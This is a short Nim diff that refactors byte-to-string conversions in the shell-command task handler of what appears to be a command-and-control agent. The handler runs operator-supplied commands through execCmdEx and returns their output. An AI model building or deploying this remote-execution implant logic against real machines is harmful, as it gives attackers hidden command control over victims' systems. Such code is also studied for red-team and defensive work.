@@ -36,11 +36,11 @@ when defined(agent):
             # Parse arguments 
             case int(task.argCount): 
             of 1: # Only the command has been passed as an argument
-                command = task.args[0].data.toString()
+                command = Bytes.toString(task.args[0].data)
                 arguments = ""
             of 2: # The optional 'arguments' parameter was included
-                command = task.args[0].data.toString()
-                arguments = task.args[1].data.toString()
+                command = Bytes.toString(task.args[0].data)
+                arguments = Bytes.toString(task.args[1].data)
             else:  
                 discard 
 
@@ -49,9 +49,9 @@ when defined(agent):
             let (output, status) = execCmdEx(fmt("{command} {arguments}")) 
 
             if output != "":
-                return createTaskResult(task, cast[StatusType](status), RESULT_STRING, output.toBytes())
+                return createTaskResult(task, cast[StatusType](status), RESULT_STRING, string.toBytes(output))
             else: 
                 return createTaskResult(task, cast[StatusType](status), RESULT_NO_OUTPUT, @[])
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
